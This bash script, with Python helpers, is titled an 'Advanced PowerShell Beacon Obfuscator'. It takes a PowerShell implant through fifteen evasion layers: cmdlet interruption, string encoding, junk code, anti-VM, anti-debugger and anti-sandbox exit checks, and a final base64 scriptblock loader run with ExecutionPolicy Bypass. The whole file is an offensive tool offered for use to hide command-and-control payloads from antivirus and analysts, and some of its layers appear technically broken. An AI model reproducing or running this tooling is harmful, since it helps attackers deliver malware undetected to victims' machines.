#!/bin/bash
# Advanced PowerShell Beacon Obfuscator
# Multi-layer obfuscation for maximum evasion

if [ $# -ne 2 ]; then
    echo "Usage: $0 <input.ps1> <output.ps1>"
    exit 1
fi

INPUT="$1"
OUTPUT="$2"

echo "[*] Advanced PowerShell Obfuscator"
echo "[*] Input:  $INPUT"
echo "[*] Output: $OUTPUT"
echo ""

# Check if input exists
if [ ! -f "$INPUT" ]; then
    echo "[-] Error: Input file not found: $INPUT"
    exit 1
fi

# Create temporary files
TEMP_DIR=$(mktemp -d)
TEMP1="$TEMP_DIR/layer1.ps1"
TEMP2="$TEMP_DIR/layer2.ps1"
TEMP3="$TEMP_DIR/layer3.ps1"
TEMP4="$TEMP_DIR/layer4.ps1"
TEMP5="$TEMP_DIR/layer5.ps1"
TEMP6="$TEMP_DIR/layer6.ps1"
TEMP7="$TEMP_DIR/layer7.ps1"
TEMP8="$TEMP_DIR/layer8.ps1"
TEMP9="$TEMP_DIR/layer9.ps1"
TEMP10="$TEMP_DIR/layer10.ps1"
TEMP11="$TEMP_DIR/layer11.ps1"
TEMP12="$TEMP_DIR/layer12.ps1"
TEMP13="$TEMP_DIR/layer13.ps1"
TEMP14="$TEMP_DIR/layer14.ps1"
TEMP15="$TEMP_DIR/layer15.ps1"

# Layer 1: Rename Objects (Variables, Functions, Parameters)
echo "[*] Layer 1: Renaming objects..."
python3 << PYEOF > "$TEMP1"
import re
import random
import string

with open("$INPUT", "r", encoding="utf-8", errors="ignore") as f:
    content = f.read()

# Generate random names
def random_name(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# Track renamed objects
renamed = {}
counter = 0

# Rename variables
def rename_var(match):
    global counter
    var_name = match.group(1)
    if var_name not in renamed:
        renamed[var_name] = f"_{random_name(12)}_{counter}"
        counter += 1
    return f"\${renamed[var_name]}"

# Rename function definitions
def rename_func(match):
    global counter
    func_name = match.group(1)
    if func_name not in renamed:
        renamed[func_name] = f"_{random_name(10)}_{counter}"
        counter += 1
    return f"function {renamed[func_name]}"

# Rename parameters
def rename_param(match):
    global counter
    param_name = match.group(1)
    if param_name not in renamed:
        renamed[param_name] = f"_{random_name(9)}_{counter}"
        counter += 1
    return f"-{renamed[param_name]}"

content = re.sub(r'\$([a-zA-Z_][a-zA-Z0-9_]*)', rename_var, content)
content = re.sub(r'function\s+([a-zA-Z_][a-zA-Z0-9_-]*)', rename_func, content)
content = re.sub(r'-([a-zA-Z_][a-zA-Z0-9_]*)', rename_param, content)

print(content)
PYEOF

# Layer 2: Obfuscate Boolean Values
echo "[*] Layer 2: Obfuscating boolean values..."
python3 << PYEOF > "$TEMP2"
import re

with open("$TEMP1", "r", encoding="utf-8", errors="ignore") as f:
    content = f.read()

# Replace true/false with obfuscated versions
def obfuscate_bool(match):
    bool_val = match.group(0)
    if bool_val.lower() == "true":
        replacements = [
            "(!`$false)",
            "([bool]1)",
            "([int]1 -eq 1)",
            "(1 -ne 0)",
            "([string]'T' -eq 'T')",
            "(!([bool]0))"
        ]
        import random
        return random.choice(replacements)
    elif bool_val.lower() == "false":
        replacements = [
            "(!`$true)",
            "([bool]0)",
            "([int]0 -eq 1)",
            "(1 -ne 1)",
            "([string]'F' -eq 'T')",
            "(!([bool]1))"
        ]
        import random
        return random.choice(replacements)
    return bool_val

content = re.sub(r'\b(true|false|True|False|TRUE|FALSE)\b', obfuscate_bool, content)

print(content)
PYEOF

# Layer 3: Cmdlet Quote Interruption
echo "[*] Layer 3: Applying cmdlet quote interruption..."
python3 << PYEOF > "$TEMP3"
import re
import random

with open("$TEMP2", "r", encoding="utf-8", errors="ignore") as f:
    content = f.read()

# Common cmdlets to obfuscate
cmdlets = [
    "Get-Command", "Invoke-Expression", "Get-Content", "Set-Content",
    "Write-Host", "Write-Output", "Read-Host", "Get-Process",
    "Start-Process", "Stop-Process", "Get-Service", "New-Object",
    "Get-Item", "Set-Item", "Remove-Item", "Get-ChildItem",
    "Test-Path", "Join-Path", "Split-Path", "ConvertFrom-Json",
    "ConvertTo-Json", "ConvertFrom-Base64", "ConvertTo-Base64"
]

def interrupt_cmdlet(match):
    cmdlet = match.group(0)
    if random.random() < 0.5:  # 50% chance
        # Quote interruption
        parts = cmdlet.split("-")
        if len(parts) == 2:
            return f"{parts[0]}'-'{parts[1]}"
    return cmdlet

for cmdlet in cmdlets:
    pattern = re.escape(cmdlet)
    content = re.sub(pattern, interrupt_cmdlet, content)

print(content)
PYEOF

# Layer 4: Cmdlet Caret Interruption
echo "[*] Layer 4: Applying cmdlet caret interruption..."
python3 << PYEOF > "$TEMP4"
import re
import random

with open("$TEMP3", "r", encoding="utf-8", errors="ignore") as f:
    content = f.read()

def caret_interrupt(match):
    cmdlet = match.group(0)
    if random.random() < 0.4:  # 40% chance
        # Insert caret at random position
        if len(cmdlet) > 3:
            pos = random.randint(1, len(cmdlet) - 2)
            return cmdlet[:pos] + "^" + cmdlet[pos:]
    return cmdlet

# Apply to cmdlet names
pattern = r'\b[A-Z][a-zA-Z]*-[A-Z][a-zA-Z]*\b'
content = re.sub(pattern, caret_interrupt, content)

print(content)
PYEOF

# Layer 5: Get-Command Technique
echo "[*] Layer 5: Applying Get-Command technique..."
python3 << PYEOF > "$TEMP5"
import re
import random

with open("$TEMP4", "r", encoding="utf-8", errors="ignore") as f:
    content = f.read()

# Replace cmdlets with Get-Command lookups
cmdlet_replacements = {
    "Invoke-Expression": "&(Get-Command 'Invoke-Expression')",
    "Get-Content": "&(Get-Command 'Get-Content')",
    "Write-Host": "&(Get-Command 'Write-Host')",
    "New-Object": "[type]::GetType('System.Management.Automation.PSObject').GetMethod('CreateInstance', [System.Reflection.BindingFlags]'NonPublic,Static').Invoke(`$null, @([System.Management.Automation.PSObject]))",
}

def replace_with_getcommand(match):
    cmdlet = match.group(0)
    if cmdlet in cmdlet_replacements and random.random() < 0.3:
        return cmdlet_replacements[cmdlet]
    return cmdlet

pattern = r'\b[A-Z][a-zA-Z]*-[A-Z][a-zA-Z]*\b'
content = re.sub(pattern, replace_with_getcommand, content)

print(content)
PYEOF

# Layer 6: Substitute Loops
echo "[*] Layer 6: Substituting loops..."
python3 << PYEOF > "$TEMP6"
import re

with open("$TEMP5", "r", encoding="utf-8", errors="ignore") as f:
    content = f.read()

# Replace foreach with ForEach-Object
def sub_foreach(match):
    return "ForEach-Object"

content = re.sub(r'\bforeach\b', sub_foreach, content, flags=re.IGNORECASE)

# Replace for loops with while
def sub_for(match):
    return "while"

content = re.sub(r'\bfor\s*\(', "while (", content, flags=re.IGNORECASE)

print(content)
PYEOF

# Layer 7: Substitute Commands
echo "[*] Layer 7: Substituting commands..."
python3 << PYEOF > "$TEMP7"
import re
import random

with open("$TEMP6", "r", encoding="utf-8", errors="ignore") as f:
    content = f.read()

# Command substitutions
substitutions = {
    "Write-Host": ["[Console]::WriteLine", "Write-Output"],
    "Get-Content": ["[System.IO.File]::ReadAllText", "[System.IO.File]::ReadAllLines"],
    "Set-Content": ["[System.IO.File]::WriteAllText"],
    "Test-Path": ["[System.IO.File]::Exists", "[System.IO.Directory]::Exists"],
}

def sub_command(match):
    cmd = match.group(0)
    if cmd in substitutions and random.random() < 0.4:
        return random.choice(substitutions[cmd])
    return cmd

for cmd, subs in substitutions.items():
    pattern = re.escape(cmd)
    content = re.sub(pattern, lambda m: random.choice(subs) if random.random() < 0.4 else m.group(0), content)

print(content)
PYEOF

# Layer 8: Mess With Strings
echo "[*] Layer 8: String manipulation..."
python3 << PYEOF > "$TEMP8"
import re
import random
import base64

with open("$TEMP7", "r", encoding="utf-8", errors="ignore") as f:
    content = f.read()

def obfuscate_string(match):
    string_val = match.group(1)
    if len(string_val) < 3:
        return match.group(0)
    
    method = random.choice(['split', 'reverse', 'base64', 'char', 'concat'])
    
    if method == 'split' and len(string_val) > 5:
        mid = len(string_val) // 2
        return f"('{string_val[:mid]}'+'{string_val[mid:]}')"
    elif method == 'reverse':
        chars = list(string_val)
        chars.reverse()
        return f"(-join('{''.join(chars)}'[-1..-{len(chars)}]))"
    elif method == 'base64':
        encoded = base64.b64encode(string_val.encode()).decode()
        return f"([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{encoded}')))"
    elif method == 'char':
        char_codes = ','.join([str(ord(c)) for c in string_val])
        return f"(-join([char[]]({char_codes})))"
    elif method == 'concat':
        parts = [string_val[i:i+2] for i in range(0, len(string_val), 2)]
        concat = "+'".join([f"'{p}'" for p in parts])
        return f"({concat})"
    
    return match.group(0)

# Obfuscate string literals
content = re.sub(r"'([^']{3,})'", obfuscate_string, content)
content = re.sub(r'"([^"]{3,})"', lambda m: obfuscate_string(m).replace("'", '"'), content)

print(content)
PYEOF

# Layer 9: Randomize Char Cases
echo "[*] Layer 9: Randomizing character cases..."
python3 << PYEOF > "$TEMP9"
import re
import random

with open("$TEMP8", "r", encoding="utf-8", errors="ignore") as f:
    content = f.read()

def randomize_case(match):
    word = match.group(0)
    # Don't randomize if it's a string literal
    if match.group(0).startswith(("'", '"')):
        return word
    
    result = ''.join(c.upper() if random.random() < 0.5 else c.lower() for c in word)
    return result

# Randomize case of identifiers (but preserve PowerShell case sensitivity rules)
content = re.sub(r'\b[a-zA-Z_][a-zA-Z0-9_]*\b', randomize_case, content)

print(content)
PYEOF

# Layer 10: Add or Remove Comments
echo "[*] Layer 10: Manipulating comments..."
python3 << PYEOF > "$TEMP10"
import re
import random

with open("$TEMP9", "r", encoding="utf-8", errors="ignore") as f:
    lines = f.readlines()

# Remove some comments, add junk comments
junk_comments = [
    "# System check",
    "# Performance optimization",
    "# Error handling",
    "# Debug mode",
    "# Configuration",
    "# Initialization",
    "# Cleanup routine",
    "# Security validation"
]

result = []
for line in lines:
    # Remove comments with 30% probability
    if '#' in line and random.random() < 0.3:
        line = line.split('#')[0].rstrip() + '\n'
    
    # Add junk comments with 20% probability
    if random.random() < 0.2 and line.strip():
        result.append(f"{random.choice(junk_comments)}\n")
    
    result.append(line)

print(''.join(result))
PYEOF

# Layer 11: Append Junk
echo "[*] Layer 11: Appending junk code..."
python3 << PYEOF > "$TEMP11"
import random
import string

with open("$TEMP10", "r", encoding="utf-8", errors="ignore") as f:
    content = f.read()

def generate_junk():
    junk_funcs = [
        f"function Get-{''.join(random.choices(string.ascii_letters, k=8))} {{ return [DateTime]::Now }}",
        f"function Test-{''.join(random.choices(string.ascii_letters, k=8))} {{ param(`$x) return `$x -ne `$null }}",
        f"function Set-{''.join(random.choices(string.ascii_letters, k=8))} {{ [Console]::Beep() }}",
        f"`$junk_{random.randint(1000,9999)} = [System.Guid]::NewGuid()",
        f"`$junk_{random.randint(1000,9999)} = Get-Random",
        f"`$junk_{random.randint(1000,9999)} = [System.Environment]::MachineName",
    ]
    return random.choice(junk_funcs)

# Add junk at beginning
junk_header = "\n".join([generate_junk() for _ in range(random.randint(3, 7))]) + "\n\n"

# Add junk at end
junk_footer = "\n\n" + "\n".join([generate_junk() for _ in range(random.randint(2, 5))])

content = junk_header + content + junk_footer

print(content)
PYEOF

# Layer 12: Rearrange Script Components
echo "[*] Layer 12: Rearranging script components..."
python3 << PYEOF > "$TEMP12"
import re
import random

with open("$TEMP11", "r", encoding="utf-8", errors="ignore") as f:
    content = f.read()

# Split into logical blocks (functions, variable assignments, etc.)
blocks = []
current_block = []

for line in content.split('\n'):
    stripped = line.strip()
    if stripped.startswith('function ') or (stripped.startswith('$') and '=' in stripped):
        if current_block:
            blocks.append('\n'.join(current_block))
        current_block = [line]
    else:
        current_block.append(line)

if current_block:
    blocks.append('\n'.join(current_block))

# Shuffle non-critical blocks (keep first few and last few in order)
if len(blocks) > 4:
    middle = blocks[1:-2]
    random.shuffle(middle)
    blocks = [blocks[0]] + middle + blocks[-2:]

content = '\n\n'.join(blocks)

print(content)
PYEOF

# Layer 13: Execute Script line by line
echo "[*] Layer 13: Converting to line-by-line execution..."
python3 << PYEOF > "$TEMP13"
import re

with open("$TEMP12", "r", encoding="utf-8", errors="ignore") as f:
    content = f.read()

# Convert to array-based line-by-line execution
lines = content.split('\n')
non_empty_lines = [line for line in lines if line.strip()]

# Create array and execution loop
script_array = "`$scriptLines = @(\n"
for i, line in enumerate(non_empty_lines):
    escaped = line.replace('"', '`"').replace('$', '`$')
    script_array += f'    "{escaped}"'
    if i < len(non_empty_lines) - 1:
        script_array += ","
    script_array += "\n"
script_array += ")\n\n"

executor = """
foreach (`$line in `$scriptLines) {
    if (`$line.Trim()) {
        try {
            Invoke-Expression `$line
        } catch {
            # Silent continue
        }
    }
}
"""

content = script_array + executor

print(content)
PYEOF

# Layer 14: Identify Detection Triggers
echo "[*] Layer 14: Adding detection triggers..."
python3 << PYEOF > "$TEMP14"
import re

with open("$TEMP13", "r", encoding="utf-8", errors="ignore") as f:
    content = f.read()

# Add anti-analysis checks at the beginning
detection_code = """
# Detection trigger checks
`$isVM = (Get-WmiObject Win32_ComputerSystem).Manufacturer -match 'VMware|VirtualBox|Xen|QEMU'
`$isDebugger = [System.Diagnostics.Debugger]::IsAttached
`$isSandbox = (Get-Process | Where-Object {`$_.ProcessName -match 'sandbox|virus|malware'}) -ne `$null
`$hasNetwork = (Test-NetConnection -ComputerName 8.8.8.8 -Port 53 -InformationLevel Quiet -WarningAction SilentlyContinue)

if (`$isVM -or `$isDebugger -or `$isSandbox -or !`$hasNetwork) {
    # Exit if detected
    exit
}

"""

content = detection_code + content

print(content)
PYEOF

# Layer 15: Increase Entropy
echo "[*] Layer 15: Increasing entropy..."
python3 << PYEOF > "$TEMP15"
import re
import random
import string

with open("$TEMP14", "r", encoding="utf-8", errors="ignore") as f:
    content = f.read()

# Add random whitespace
def add_random_whitespace(match):
    line = match.group(0)
    if random.random() < 0.3:
        # Add random spaces/tabs
        spaces = ' ' * random.randint(1, 3)
        return spaces + line + spaces
    return line

# Add random variable assignments with high entropy
entropy_vars = []
for _ in range(random.randint(5, 10)):
    var_name = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(10, 20)))
    var_value = ''.join(random.choices(string.ascii_letters + string.digits + string.punctuation, k=random.randint(20, 50)))
    entropy_vars.append(f"`${var_name} = '{var_value}'")

entropy_block = "\n".join(entropy_vars) + "\n\n"

content = entropy_block + content

# Add random characters in comments
def add_entropy_to_comments(match):
    comment = match.group(0)
    junk = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(5, 15)))
    return comment.rstrip() + f" {junk}"

content = re.sub(r'#.*', add_entropy_to_comments, content)

print(content)
PYEOF

# Final: Base64 encoding wrapper
echo "[*] Final Layer: Base64 encoding wrapper..."
# Use -w0 for GNU base64 (Linux), fallback to standard base64 (macOS/BSD)
BASE64_CONTENT=$(cat "$TEMP15" | iconv -t UTF-16LE | base64 -w0 2>/dev/null || cat "$TEMP15" | iconv -t UTF-16LE | base64 | tr -d '\n')

cat > "$OUTPUT" << EOF
# Obfuscated Beacon Loader - Multi-Layer Protection
`$enc = [System.Text.Encoding]::Unicode
`$dec = [System.Convert]::FromBase64String
`$scr = `$enc.GetString(`$dec.Invoke('$BASE64_CONTENT'))
`$sb = [scriptblock]::Create(`$scr)
& `$sb
EOF

# Cleanup
rm -rf "$TEMP_DIR"

echo ""
echo "[+] Obfuscation complete!"
echo "[+] Original size: $(wc -c < "$INPUT" 2>/dev/null || echo "0") bytes"
echo "[+] Obfuscated size: $(wc -c < "$OUTPUT" 2>/dev/null || echo "0") bytes"
echo ""
echo "[*] Test with: powershell.exe -ExecutionPolicy Bypass -File $OUTPUT"